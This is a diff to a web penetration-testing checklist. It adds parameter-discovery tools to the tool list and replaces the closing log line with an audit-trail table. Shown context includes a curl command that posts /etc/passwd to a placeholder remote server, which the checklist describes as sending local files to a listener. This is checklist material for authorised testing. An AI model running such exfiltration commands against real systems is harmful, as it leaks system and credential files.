@@ -139,7 +139,7 @@ Before you start ticking boxes, ensure your environment is set up. You cannot re
 
 > [!TIP] **Don't Just Use Your Browser bar!**
 > While you can type payloads into the top of Chrome, it often URL-encodes special characters (turning `<` into `%3C`), which might break your attack. Always send the request to **Burp Repeater** and inject your payloads there.
-> **Tools:** `Param Miner` (to find hidden parameters), `ffuf` (to fuzz values).
+> **Tools:** `Param Miner` (to find hidden parameters), `arjun` / `msarjun` / `x8` (multi-threaded discovery), `ffuf` (to fuzz values).
 > **Fuzzing Wordlists:**
 > - **Parameter Names:** `SecLists/Discovery/Web-Content/burp-parameter-names.txt`
 > - **Common Values:** `Assetnote/fuzzing/parameters.txt`
@@ -1525,4 +1525,8 @@ Before you start ticking boxes, ensure your environment is set up. You cannot re
 >   `curl -X POST -d @/etc/passwd http://your-server.com/` (Sends local files to your remote listener).
 
 ---
-*End of High-Density Checklist — Full log: [[Audit_Trail.md]]*
+
+## ## Audit Trail
+| Date | Source | Changes |
+|---|---|---|
+| 2026-03-10 | Antigravity | Integrated new recon tools (`arjun`, `kiterunner`, `passive.py` v3.0). |
